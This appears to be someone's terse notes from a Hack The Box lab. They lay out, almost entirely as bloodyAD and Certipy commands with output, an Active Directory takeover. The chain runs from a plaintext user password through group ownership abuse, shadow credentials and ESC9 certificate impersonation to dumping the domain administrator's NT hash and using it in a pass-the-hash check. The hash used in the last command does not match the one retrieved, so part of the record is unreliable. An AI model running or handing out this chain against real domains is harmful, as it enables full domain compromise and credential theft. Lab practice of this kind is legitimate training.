___



Username: judith.mader Password: judith09



*this is an interesting acct here*
ca_operator



*this fucker has remote*
     "sAMAccountName": [
            "management_svc"
        ],
        "sAMAccountType": [
            805306368
        ],
        "servicePrincipalName": [
            "certified.htb/management_svc.DC01"
        ],


management has genericAll over ca_operator



*steps*


*set owner group*
./bin/python3 bloodyAD.py -u 'judith.mader' -p 'judith09' --dc-ip 10.10.11.41 -d certified.htb set owner Management judith.mader

*set genericAll perms*
./bin/python3 bloodyAD.py -u 'judith.mader' -p 'judith09' --dc-ip 10.10.11.41 -d certified.htb add genericAll Management judith.mader

*add myself to group*
./bin/python3 bloodyAD.py -u 'judith.mader' -p 'judith09' --dc-ip 10.10.11.41 -d certified.htb add groupMember Management judith.mader

*create cert creds*
./bin/python3 bloodyAD.py -u 'judith.mader' -p 'judith09' --dc-ip 10.10.11.41 -d certified.htb add shadowCredentials management_svc

*create cert creds for ca_operator*
KRB5CCNAME=../../apps/bloodyAD/management_svc_NA.ccache ./bin/python3 certipy/entry.py shadow auto -target 'DC01.certified.htb' -u 'management_svc@certified.htb' -k -account 'ca_operator' -dc-ip 10.10.11.41


*find vuln certs*
KRB5CCNAME=./ca_operator.ccache ./bin/python3 certipy/entry.py find -vuln -u 'ca_operator@certified.htb' -target 'DC01.certified.htb' -k -dc-ip 10.10.11.41
Certipy v5.0.3 - by Oliver Lyak (ly4k)



*there is a vulnerable certificate ESC9*


*changed upn of ca_operator to administrator for impersanation*
KRB5CCNAME=/home/ew/apps/bloodyAD/management_svc_NA.ccache ./bin/python3 certipy/entry.py account update -u 'management_svc@certified.htb' -target 'DC01.certified.htb' -k -user 'ca_operator' -upn 'administrator@certified.htb' -dc-ip 10.10.11.41


*request cert*
KRB5CCNAME=./ca_operator.ccache ./bin/python3 certipy/entry.py req -u 'ca_operator@certified.htb' -target 'DC01.certified.htb' -k -ca certified-DC01-CA -template CertifiedAuthentication -dc-ip 10.10.11.41


*revert UPN to not break auth*
KRB5CCNAME=/home/ew/apps/bloodyAD/management_svc_NA.ccache ./bin/python3 certipy/entry.py account update -u 'management_svc@certified.htb' -target 'DC01.certified.htb' -k -user 'ca_operator' -upn 'ca_operator@certified.htb' -dc-ip 10.10.11.41 



*getting TGT with certificate*
./bin/python3 certipy/entry.py auth -pfx ca_operator.pfx -dc-ip '10.10.11.41'




# admin hash


└> ./bin/python3 certipy/entry.py auth -pfx administrator.pfx -dc-ip '10.10.11.41' 
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@certified.htb'
[*] Using principal: 'administrator@certified.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@certified.htb': aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34





*check hash by authenticating to ldap*
nxc ldap 10.10.11.41 -u administrator -H b4b86f45c6018f1b664f70805f45d8f2 -d certified.htb